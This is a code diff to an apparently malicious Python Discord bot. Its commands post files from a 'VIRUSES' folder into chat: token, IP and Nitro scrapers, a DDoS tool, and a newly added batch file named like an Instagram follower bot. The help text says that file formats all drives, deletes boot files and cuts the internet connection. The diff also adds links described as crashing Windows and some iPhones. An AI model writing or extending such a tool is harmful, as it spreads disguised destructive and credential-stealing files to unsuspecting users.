@@ -248,6 +248,7 @@ async def crash(ctx):
     await ctx.send("https://gfycat.com/anguisheddefinitivegoldenretriever")
     await ctx.send("https://gfycat.com/achingclearcaecilian")
     await ctx.send("https://gfycat.com/anxioussharpfox")
+    await ctx.send("https://imgur.com/ehxMcVy?nocache=true")
 
 @LSD.event
 async def on_command_error(ctx, error):
@@ -3243,30 +3244,37 @@ async def scra(ctx):
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/toxic-nitrogen.bat"))
     
-@LSD.command(pass_context=True)
+@LSD.command(aliases=["Poweroff", "POWEROFF"],pass_context=True)
 async def poweroff(ctx):
 
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-IP-Scraper v1.5.c"))
     
-@LSD.command(pass_context=True)
+@LSD.command(aliases=["Mouse", "MOUSE"],pass_context=True)
 async def mouse(ctx):
 
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/out_of_control-ddos.java"))
     
 
-@LSD.command(pass_context=True)
-async def window(ctx):
+@LSD.command(aliases=["Windows", "WINDOWS"],pass_context=True)
+async def windows(ctx):
 
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Nitro-Scraper v2.3.c"))
     
-@LSD.command(pass_context=True)
+@LSD.command(aliases=["Unending", "UNENDING"],pass_context=True)
 async def unending(ctx):
 
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-Token-Scraper v1.0.vbs"))
+    
+@LSD.command(aliases=["Instabot", "INSTABOT"],pass_context=True)
+async def instabot(ctx):
+
+    await ctx.message.delete()
+    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Insta.FollowM3-bot.bat"))
+
 
 
 
@@ -3294,10 +3302,13 @@ async def MALICIOUS(ctx):
     embed.set_author(name='')
     embed.add_field(name='POWEROFF', value='Simply shuts the system down.')
     embed.add_field(name='UNENDING', value='Shows an unending sequence of annoying messages.')
+    embed.add_field(name='INSTABOT', value='Deletes necessary files to boot up PC. Formats all drives. Removes internet connection from the pc.')
     embed.add_field(name='BYPASS', value='This file should shutdown the persons computer. It shuts it off once and deletes the files needed to reboot and restart.')
     embed.add_field(name='GETHOST', value='this willl return host of ip addresses.')
     embed.add_field(name='WINDOW', value='Randomly moves the window round. Only Ctrl+Alt+Del will work here.')
     embed.add_field(name='MOUSE', value='Randomly moves the mouse pointer, & clicks different places on the screen.')
+    embed.set_footer(text='☠ ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ☠')
+    embed.add_field(name='CRASH', value='Sends several gifs that will crash Windows and some IPhones.')
     embed.set_footer(text='☠ ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ☠')
 
     await ctx.send(author, embed=embed)
